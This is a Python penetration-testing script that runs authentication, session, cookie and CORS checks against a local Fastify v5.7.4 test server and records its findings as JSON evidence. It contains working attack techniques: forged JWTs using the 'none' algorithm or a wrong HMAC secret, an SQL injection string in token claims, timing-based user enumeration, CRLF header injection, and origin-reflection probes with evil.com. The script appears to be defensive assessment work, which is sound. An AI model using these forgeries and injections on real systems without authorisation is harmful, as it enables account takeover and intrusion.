#!/usr/bin/env python3
"""
Phase 4: Authentication, Session & Cookie Attacks
Target: Fastify v5.7.4 @ http://127.0.0.1:3000
"""

import json, time, sys, os, statistics
os.environ['PYTHONUNBUFFERED'] = '1'
import requests

BASE = 'http://127.0.0.1:3000'
EVIDENCE = {
    'phase': 4, 'title': 'Auth, Session & Cookie Attacks',
    'target': 'Fastify v5.7.4',
    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'tests': [], 'findings': [], 'anomalies': [],
}
test_count = anomaly_count = 0

def log(msg): print(f"[*] {msg}", flush=True)
def log_ok(msg): print(f"[+] {msg}", flush=True)
def log_warn(msg): print(f"[!] {msg}", flush=True)
def log_finding(msg): print(f"[!!!] FINDING: {msg}", flush=True)

def add_test(name, cat, result, details=None):
    global test_count; test_count += 1
    entry = {'id': test_count, 'name': name, 'category': cat, 'result': result}
    if details: entry['details'] = details
    EVIDENCE['tests'].append(entry)

def add_anomaly(name, details):
    global anomaly_count; anomaly_count += 1
    EVIDENCE['anomalies'].append({'id': anomaly_count, 'name': name, 'details': details})

# ==============================================================
# SECTION 1: JWT Attacks
# ==============================================================
def test_jwt():
    log("=" * 60)
    log("SECTION 1: JWT Authentication Attacks")
    log("=" * 60)

    # Get valid token
    log("\n--- Get valid token ---")
    resp = requests.post(f'{BASE}/auth/login', json={'username': 'admin', 'password': 'admin123'})
    assert resp.status_code == 200
    valid_token = resp.json()['token']
    log(f"  Valid token obtained: {valid_token[:40]}...")
    add_test('JWT-login', 'jwt', 'ok')

    # Test 1: Token without verification
    log("\n--- JWT decode without verification ---")
    resp2 = requests.post(f'{BASE}/auth/decode', json={'token': valid_token})
    if resp2.status_code == 200:
        decoded = resp2.json().get('decoded', {})
        log(f"  Decoded payload: {json.dumps(decoded, indent=2)}")
        if decoded.get('payload', {}).get('role') == 'admin':
            log_warn("  Token decoded without verification exposes role claim!")
    add_test('JWT-decode-noverify', 'jwt', str(resp2.status_code))

    # Test 2: None algorithm attack
    log("\n--- None algorithm attack ---")
    import base64
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
    payload = base64.urlsafe_b64encode(json.dumps({"username": "admin", "role": "admin"}).encode()).rstrip(b'=')
    none_token = f"{header.decode()}.{payload.decode()}."
    resp3 = requests.get(f'{BASE}/auth/profile', headers={'Authorization': f'Bearer {none_token}'})
    log(f"  None alg token: status={resp3.status_code}")
    if resp3.status_code == 200:
        log_finding("None algorithm attack SUCCEEDED!")
        EVIDENCE['findings'].append({
            'id': 'P4-F-JWT-NONE',
            'severity': 'CRITICAL',
            'title': 'JWT none algorithm bypass',
            'evidence': resp3.json(),
        })
    else:
        log_ok("  None algorithm rejected")
    add_test('JWT-none-alg', 'jwt', str(resp3.status_code))

    # Test 3: Forged token with wrong secret
    log("\n--- Forged token with wrong secret ---")
    import hmac, hashlib
    header_b = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b'=')
    payload_b = base64.urlsafe_b64encode(json.dumps({"username": "admin", "role": "admin", "iat": int(time.time())}).encode()).rstrip(b'=')
    sig_input = f"{header_b.decode()}.{payload_b.decode()}"
    sig = base64.urlsafe_b64encode(hmac.new(b'wrong-secret', sig_input.encode(), hashlib.sha256).digest()).rstrip(b'=')
    forged = f"{sig_input}.{sig.decode()}"
    resp4 = requests.get(f'{BASE}/auth/profile', headers={'Authorization': f'Bearer {forged}'})
    log(f"  Wrong secret token: status={resp4.status_code}")
    if resp4.status_code == 200:
        log_finding("JWT verification bypassed with wrong secret!")
    else:
        log_ok("  Wrong secret token rejected")
    add_test('JWT-wrong-secret', 'jwt', str(resp4.status_code))

    # Test 4: Expired token
    log("\n--- Expired token ---")
    payload_exp = base64.urlsafe_b64encode(json.dumps({
        "username": "admin", "role": "admin",
        "iat": int(time.time()) - 7200,
        "exp": int(time.time()) - 3600,
    }).encode()).rstrip(b'=')
    sig_input2 = f"{header_b.decode()}.{payload_exp.decode()}"
    sig2 = base64.urlsafe_b64encode(hmac.new(b'test-jwt-secret-for-assessment', sig_input2.encode(), hashlib.sha256).digest()).rstrip(b'=')
    expired = f"{sig_input2}.{sig2.decode()}"
    resp5 = requests.get(f'{BASE}/auth/profile', headers={'Authorization': f'Bearer {expired}'})
    log(f"  Expired token: status={resp5.status_code}")
    add_test('JWT-expired', 'jwt', str(resp5.status_code))

    # Test 5: Token with SQL injection in claims
    log("\n--- SQL injection in JWT claims ---")
    resp6 = requests.post(f'{BASE}/auth/decode', json={'token': valid_token.split('.')[0] + '.' +
        base64.urlsafe_b64encode(json.dumps({"username": "admin' OR 1=1--", "role": "admin"}).encode()).rstrip(b'=').decode() + '.' + valid_token.split('.')[2]})
    log(f"  SQLi in claims: status={resp6.status_code}")
    add_test('JWT-sqli-claims', 'jwt', str(resp6.status_code))

    # Test 6: Missing Authorization header
    log("\n--- Missing Authorization ---")
    resp7 = requests.get(f'{BASE}/auth/profile')
    log(f"  No auth header: status={resp7.status_code}")
    add_test('JWT-no-auth', 'jwt', str(resp7.status_code))

    # Test 7: Malformed Bearer prefix
    log("\n--- Malformed Bearer prefix ---")
    for prefix in ['bearer', 'BEARER', 'Bear', 'Token']:
        resp8 = requests.get(f'{BASE}/auth/profile',
                           headers={'Authorization': f'{prefix} {valid_token}'})
        log(f"  Prefix '{prefix}': status={resp8.status_code}")
        add_test(f'JWT-prefix-{prefix}', 'jwt', str(resp8.status_code))


# ==============================================================
# SECTION 2: Timing Oracle (User Enumeration)
# ==============================================================
def test_timing_oracle():
    log("")
    log("=" * 60)
    log("SECTION 2: Login Timing Oracle")
    log("=" * 60)

    # The server has a 50ms delay for valid usernames
    valid_user_times = []
    invalid_user_times = []

    log("  Running 20 timing measurements...")
    for i in range(20):
        # Valid user (admin)
        t1 = time.time()
        requests.post(f'{BASE}/auth/login', json={'username': 'admin', 'password': 'wrong'})
        valid_user_times.append((time.time() - t1) * 1000)

        # Invalid user
        t2 = time.time()
        requests.post(f'{BASE}/auth/login', json={'username': f'nonexistent{i}', 'password': 'wrong'})
        invalid_user_times.append((time.time() - t2) * 1000)

    valid_avg = statistics.mean(valid_user_times)
    invalid_avg = statistics.mean(invalid_user_times)
    valid_std = statistics.stdev(valid_user_times)
    invalid_std = statistics.stdev(invalid_user_times)
    diff = valid_avg - invalid_avg

    log(f"  Valid user (admin): avg={valid_avg:.1f}ms, std={valid_std:.1f}ms")
    log(f"  Invalid user:       avg={invalid_avg:.1f}ms, std={invalid_std:.1f}ms")
    log(f"  Difference: {diff:.1f}ms")

    if diff > 20:
        log_finding(f"Timing oracle detected! {diff:.1f}ms difference enables user enumeration")
        EVIDENCE['findings'].append({
            'id': 'P4-F01',
            'severity': 'MEDIUM',
            'title': 'Login timing oracle enables user enumeration',
            'description': f'Valid username (admin) responses take {valid_avg:.1f}ms avg vs '
                         f'{invalid_avg:.1f}ms for invalid users. {diff:.1f}ms difference '
                         f'(intentional 50ms delay) enables reliable user enumeration.',
            'evidence': {
                'valid_avg_ms': round(valid_avg, 1),
                'invalid_avg_ms': round(invalid_avg, 1),
                'difference_ms': round(diff, 1),
                'measurements': 20,
            },
        })
    add_test('Timing-oracle', 'auth', f'{diff:.1f}ms diff')


# ==============================================================
# SECTION 3: Cookie Security
# ==============================================================
def test_cookies():
    log("")
    log("=" * 60)
    log("SECTION 3: Cookie Security")
    log("=" * 60)

    # Test 1: Cookie attributes
    log("\n--- Cookie attribute testing ---")
    session = requests.Session()
    resp = session.get(f'{BASE}/cookie/set?name=session&value=test123')
    cookies = resp.cookies
    for cookie in session.cookies:
        log(f"  Cookie: {cookie.name}={cookie.value[:20]}...")
        log(f"    HttpOnly: {cookie.has_nonstandard_attr('HttpOnly') or 'httponly' in str(cookie).lower()}")
        log(f"    Secure: {cookie.secure}")
        log(f"    SameSite: checking...")
    add_test('Cookie-attributes', 'cookies', str(resp.status_code))

    # Test 2: Cookie without HttpOnly
    log("\n--- Cookie without HttpOnly ---")
    resp2 = session.get(f'{BASE}/cookie/set?name=exposed&value=sensitive&httpOnly=false')
    log(f"  Set cookie without HttpOnly: {resp2.status_code}")
    EVIDENCE['findings'].append({
        'id': 'P4-F02',
        'severity': 'LOW',
        'title': 'Cookies can be set without HttpOnly flag',
        'description': 'The /cookie/set endpoint allows setting httpOnly=false, making cookies '
                     'accessible to client-side JavaScript. This is app-level, not framework.',
        'note': 'App-level misconfiguration, not framework vulnerability.',
    })
    add_test('Cookie-no-httponly', 'cookies', str(resp2.status_code))

    # Test 3: Signed cookie verification
    log("\n--- Signed cookie verification ---")
    session2 = requests.Session()
    resp3 = session2.get(f'{BASE}/cookie/signed/set?value=secret-data')
    log(f"  Set signed cookie: {resp3.status_code}")

    # Read back
    resp4 = session2.get(f'{BASE}/cookie/signed/get')
    if resp4.status_code == 200:
        body = resp4.json()
        log(f"  Signed cookie: raw={body.get('raw', '')[:40]}")
        unsigned = body.get('unsigned', {})
        log(f"  Unsigned: valid={unsigned.get('valid')}, value={unsigned.get('value')}")
    add_test('Cookie-signed-verify', 'cookies', str(resp4.status_code))

    # Test 4: Tampered signed cookie
    log("\n--- Tampered signed cookie ---")
    session3 = requests.Session()
    session3.get(f'{BASE}/cookie/signed/set?value=original')
    session3.cookies.set('signed_test', 'tampered.invalidsig', domain='127.0.0.1')
    resp5 = session3.get(f'{BASE}/cookie/signed/get')
    if resp5.status_code == 200:
        body = resp5.json()
        unsigned = body.get('unsigned', {})
        log(f"  Tampered cookie validation: valid={unsigned.get('valid')}")
        if unsigned.get('valid'):
            log_finding("Tampered signed cookie accepted as valid!")
        else:
            log_ok("  Tampered cookie correctly rejected")
    add_test('Cookie-tamper-signed', 'cookies', str(resp5.status_code))

    # Test 5: Cookie injection via CRLF
    log("\n--- Cookie CRLF injection ---")
    resp6 = session.get(f'{BASE}/cookie/set?name=test%0d%0aSet-Cookie%3a+injected%3dtrue&value=x')
    log(f"  CRLF injection attempt: {resp6.status_code}")
    add_test('Cookie-crlf-injection', 'cookies', str(resp6.status_code))

    # Test 6: Cookie overflow
    log("\n--- Cookie overflow ---")
    resp7 = session.get(f'{BASE}/cookie/set?name=overflow&value={"A" * 8192}')
    log(f"  8KB cookie value: {resp7.status_code}")
    add_test('Cookie-overflow', 'cookies', str(resp7.status_code))


# ==============================================================
# SECTION 4: CORS Configuration
# ==============================================================
def test_cors():
    log("")
    log("=" * 60)
    log("SECTION 4: CORS Configuration")
    log("=" * 60)

    # Test: Origin reflection
    origins = [
        'http://evil.com',
        'http://localhost',
        'http://127.0.0.1',
        'null',
        '',
        'http://evil.com.legit.com',
        'http://legit.com.evil.com',
    ]

    for origin in origins:
        headers = {'Origin': origin} if origin else {}
        resp = requests.get(f'{BASE}/health', headers=headers)
        acao = resp.headers.get('Access-Control-Allow-Origin', 'missing')
        acac = resp.headers.get('Access-Control-Allow-Credentials', 'missing')
        log(f"  Origin: {origin or '(none)'} -> ACAO: {acao}, ACAC: {acac}")

        if acao == origin and acac == 'true' and 'evil' in origin:
            log_warn(f"    Reflected evil origin with credentials!")
            add_anomaly(f'cors-reflect-{origin}', {'acao': acao, 'acac': acac})
        add_test(f'CORS-{origin or "none"}', 'cors', f'ACAO={acao}')

    # Preflight test
    log("\n--- CORS Preflight ---")
    resp_pf = requests.options(f'{BASE}/api/users',
                              headers={
                                  'Origin': 'http://evil.com',
                                  'Access-Control-Request-Method': 'POST',
                                  'Access-Control-Request-Headers': 'Content-Type',
                              })
    log(f"  Preflight status: {resp_pf.status_code}")
    log(f"  Allow-Methods: {resp_pf.headers.get('Access-Control-Allow-Methods', 'missing')}")
    log(f"  Allow-Headers: {resp_pf.headers.get('Access-Control-Allow-Headers', 'missing')}")
    add_test('CORS-preflight', 'cors', str(resp_pf.status_code))

    # CORS + credentials warning
    EVIDENCE['findings'].append({
        'id': 'P4-F03',
        'severity': 'MEDIUM',
        'title': 'CORS wildcard origin with credentials enabled',
        'description': 'CORS is configured with origin:true (reflects any Origin) and '
                     'credentials:true. Any website can make credentialed cross-origin requests. '
                     'This is app-level config, not a framework default.',
        'note': 'Config-dependent. Fastify default is no CORS plugin registered.',
    })


# ==============================================================
# MAIN
# ==============================================================
def main():
    log(f"Phase 4 Attack Script - Fastify v5.7.4")
    log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        r = requests.get(f'{BASE}/health', timeout=3)
        log(f"Server: Fastify {r.json()['version']}")
    except:
        log("ERROR: Server not reachable"); sys.exit(1)

    test_jwt()
    test_timing_oracle()
    test_cookies()
    test_cors()

    log(f"\nPHASE 4 COMPLETE: {test_count} tests, {len(EVIDENCE['findings'])} findings, {anomaly_count} anomalies")
    EVIDENCE.update({'total_tests': test_count, 'total_findings': len(EVIDENCE['findings']), 'total_anomalies': anomaly_count})

    with open('/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/evidence/phase4_auth_session.json', 'w') as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log("Evidence saved.")

if __name__ == '__main__':
    main()
